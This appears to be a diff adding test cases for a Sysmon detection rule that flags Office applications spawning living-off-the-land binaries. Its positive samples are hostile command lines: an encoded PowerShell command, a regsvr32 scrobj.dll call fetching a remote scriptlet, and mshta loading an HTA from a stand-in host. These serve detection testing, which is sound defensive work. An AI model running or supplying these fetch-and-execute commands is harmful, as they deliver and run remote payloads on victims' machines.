@@ -1,0 +1,20 @@
+rule: sysmon-office-spawn-lolbin
+
+positive:
+  - description: WINWORD spawning PowerShell with encoded command
+    event:
+      commandline: 'WINWORD.EXE doc | powershell.exe -EncodedCommand JABzAD0A'
+  - description: EXCEL launching regsvr32 (Qakbot pattern)
+    event:
+      commandline: 'EXCEL.EXE | regsvr32.exe /s /n /u /i:http://x.local/payload.sct scrobj.dll'
+  - description: Outlook launching mshta (HTML smuggle aftermath)
+    event:
+      commandline: 'OUTLOOK.EXE | mshta.exe https://evil.tld/loader.hta'
+
+negative:
+  - description: WINWORD launching printer driver
+    event:
+      commandline: 'WINWORD.EXE | splwow64.exe 12345'
+  - description: Stand-alone PowerShell command
+    event:
+      commandline: 'powershell.exe Get-Service'
